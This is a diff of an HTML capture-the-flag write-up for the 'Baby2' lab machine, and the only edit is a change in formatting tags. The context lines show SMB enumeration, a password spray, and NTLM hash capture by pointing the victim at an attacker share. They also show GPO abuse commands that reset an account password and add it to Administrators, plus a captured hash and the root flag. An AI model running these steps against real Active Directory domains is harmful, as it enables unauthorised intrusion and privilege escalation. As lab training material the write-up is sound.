@@ -160,7 +160,7 @@ Host script results:
 |_  start_date: N/A</code></pre></div>
       <h2 class="writeup-section-title">Foothold: SMB Enumeration & Login Script Abuse</h2>
       <h3 class="writeup-sub-title">Anonymous SMB Access</h3>
-      <p>Since no credentials were provided, I check for anonymous access on the SMB server. Anonymous authentication succeeds, and I discover <strong>read and write permissions</strong> on the <code>homes</code> share.</p>
+      <p>Since no credentials were provided, I check for anonymous access on the SMB server. Anonymous authentication succeeds, and I discover <code>read and write permissions</code> on the <code>homes</code> share.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
 └─$ smbmap -H 10.129.234.72 -u anonymous 
 
@@ -197,7 +197,7 @@ smb: \&gt; ls
 
                 6126847 blocks of size 4096. 1091338 blocks available</code></pre></div>
       <h3 class="writeup-sub-title">Discovering the Login Script</h3>
-      <p>The share directories are empty. I pivot to the <strong>NETLOGON</strong> share and find a <code>login.vbs</code> file — a VBScript executed by the Windows Script Host (WSH) during user logon. I download it for analysis.</p>
+      <p>The share directories are empty. I pivot to the <code>NETLOGON</code> share and find a <code>login.vbs</code> file — a VBScript executed by the Windows Script Host (WSH) during user logon. I download it for analysis.</p>
       <div class="code-block"><pre><code>smb: \&gt; get login.vbs
 getting file \login.vbs of size 992 as login.vbs (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)</code></pre></div>
       <p>I inspect the file contents for sensitive data such as hardcoded credentials, configuration parameters, internal hostnames, or references to other services that could expand the attack surface.</p>
@@ -260,7 +260,7 @@ getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (9.5 KiloBytes/sec
 smb: \dev\&gt; get CHANGELOG
 getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.8 KiloBytes/sec) (average 5.9 KiloBytes/sec)</code></pre></div>
       <h3 class="writeup-sub-title">Password Spray</h3>
-      <p>With no credentials found, I try a <strong>password spray</strong> — testing whether any users have set their password equal to their username (a common weak-password pattern). Using <code>netexec</code>, two valid credential pairs are discovered.</p>
+      <p>With no credentials found, I try a <code>password spray</code> — testing whether any users have set their password equal to their username (a common weak-password pattern). Using <code>netexec</code>, two valid credential pairs are discovered.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
 └─$ cat users.txt 
 Amelia.Griffiths
@@ -421,7 +421,7 @@ PS C:\&gt; cat user.txt
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">See terminal output</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: GPO Abuse</h2>
       <h3 class="writeup-sub-title">NTLMv1 Hash Capture</h3>
-      <p>To escalate privileges, I attempt to capture NTLM hashes. While still logged in as <code>amelia.griffiths</code>, I start <strong>Responder</strong> on a separate terminal to capture authentication hashes. The captured hash is NTLMv1 — which is harder to crack than NTLMv2 and must first be converted to standard NTLM format.</p>
+      <p>To escalate privileges, I attempt to capture NTLM hashes. While still logged in as <code>amelia.griffiths</code>, I start <code>Responder</code> on a separate terminal to capture authentication hashes. The captured hash is NTLMv1 — which is harder to crack than NTLMv2 and must first be converted to standard NTLM format.</p>
       <div class="code-block"><pre><code>whoami
 baby2\amelia.griffiths
 PS C:\Windows\system32&gt; net use \\10.10.16.154\share</code></pre></div>
@@ -431,16 +431,16 @@ PS C:\Windows\system32&gt; net use \\10.10.16.154\share</code></pre></div>
 
 [SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:6D884DE3BF10003000000000000000000000000000000000:7E5EEEF5DE5D649574C9D42015571A7C3BF60115F8B98352:2532e99d6c6defe8</code></pre></div>
       <h3 class="writeup-sub-title">BloodHound Attack Path</h3>
-      <p>Converting the NTLMv1 hash hits a dead end — the conversion tools produce errors and the hash cannot be cracked. I return to BloodHound and analyze the <strong>shortest path to Domain Admins</strong>.</p>
+      <p>Converting the NTLMv1 hash hits a dead end — the conversion tools produce errors and the hash cannot be cracked. I return to BloodHound and analyze the <code>shortest path to Domain Admins</code>.</p>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20260115201232.png" alt="BloodHound shortest path to Domain Admins" loading="lazy" /><span class="img-caption">BloodHound shortest path to Domain Admins</span></div>
       <h3 class="writeup-sub-title">GPO Ownership & Abuse</h3>
-      <p>The attack path requires changing the password of the <code>gpoadm</code> user, adding the appropriate domain object ACL, and then performing a <strong>GPO abuse attack</strong>. A Group Policy Object (GPO) abuse allows an attacker to modify group policies to add themselves to the Administrators group.</p>
+      <p>The attack path requires changing the password of the <code>gpoadm</code> user, adding the appropriate domain object ACL, and then performing a <code>GPO abuse attack</code>. A Group Policy Object (GPO) abuse allows an attacker to modify group policies to add themselves to the Administrators group.</p>
       <h4 class="writeup-step-title">Step 1 — Change gpoadm password and add DomainObjectACL</h4>
       <div class="code-block"><pre><code>$UserPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainTect -Force
 PS C:\temp&gt; Set-DomainUserPassword -Identity gpoadm -AccountPassword $UserPassword
 PS C:\temp&gt; Add-DomainObjectAcl -TargetIdentity &quot;gpoadm&quot; -PrincipalIdentity amelia.griffiths -Domain baby2.vl -Rights All -Verbose</code></pre></div>
       <h4 class="writeup-step-title">Step 2 — Retrieve GPO ID using GPOwned</h4>
-      <p>I use the <strong>GPOwned</strong> tool (<a href="https://github.com/X-C3LL/GPOwned)" target="_blank" rel="noopener">https://github.com/X-C3LL/GPOwned)</a> to find the GPO ID required for the abuse.</p>
+      <p>I use the <code>GPOwned</code> tool (<a href="https://github.com/X-C3LL/GPOwned)" target="_blank" rel="noopener">https://github.com/X-C3LL/GPOwned)</a> to find the GPO ID required for the abuse.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/BabyTwo]
 └─$ python3 GPOwned.py -u gpoadm -p &#x27;Password123!&#x27; -d baby2.vl -dc-ip 10.129.234.72 -gpcmachine -listgpo
                 GPO Helper - @TheXC3LL
@@ -478,7 +478,7 @@ PS C:\temp&gt; Add-DomainObjectAcl -TargetIdentity &quot;gpoadm&quot; -Principal
 
 [^] Have a nice day!</code></pre></div>
       <h4 class="writeup-step-title">Step 3 — GPO Abuse with pyGPOAbuse</h4>
-      <p>Using <strong>pyGPOAbuse</strong> (<a href="https://github.com/Hackndo/pyGPOAbuse)," target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse),</a> I modify the GPO to add the <code>gpoadm</code> user to the local Administrators group. After the GPO refreshes, the gpoadm account has administrator privileges.</p>
+      <p>Using <code>pyGPOAbuse</code> (<a href="https://github.com/Hackndo/pyGPOAbuse)," target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse),</a> I modify the GPO to add the <code>gpoadm</code> user to the local Administrators group. After the GPO refreshes, the gpoadm account has administrator privileges.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/BabyTwo/pyGPOAbuse]
 └─$ python3 pygpoabuse.py baby2.vl/gpoadm:&#x27;Password123!&#x27; -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -dc-ip 10.129.234.72 -v -command &#x27;net localgroup administrators /add gpoadm&#x27;
 [*] Version updated
@@ -515,7 +515,7 @@ Logon hours allowed          All
 
 Local Group Memberships      *Administrators
 Global Group memberships     *Domain Users</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 293500962edc31fa154951eeeb5740f9</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">See terminal output</code></div>
